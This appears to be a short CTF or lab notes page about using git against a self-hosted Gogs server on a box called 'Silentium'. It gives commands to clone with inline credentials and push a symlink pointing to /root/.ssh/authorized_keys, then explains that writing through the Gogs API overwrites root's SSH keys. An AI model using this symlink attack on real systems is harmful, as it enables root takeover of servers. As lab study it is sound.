# git

Source control client. Used as the attack vector against Gogs: cloning, creating a symlink in the working tree, committing and pushing it so that the server-side API later resolves the symlink when writing content.

## Commands Used

### Clone a self-hosted repository with inline credentials
```bash
git clone http://123:1234Abcd@@127.0.0.1:8080/123/pwn.git
cd pwn
```
Used on: **Silentium**

### Add a symlink pointing to a sensitive file and push it
```bash
ln -s /root/.ssh/authorized_keys link
git add link
git commit -m "Add symlink"
git push
```
Used on: **Silentium**

After the push, writing content to `link` through the Gogs API resolves the symlink and writes to `/root/.ssh/authorized_keys` as the Gogs process (running as root).
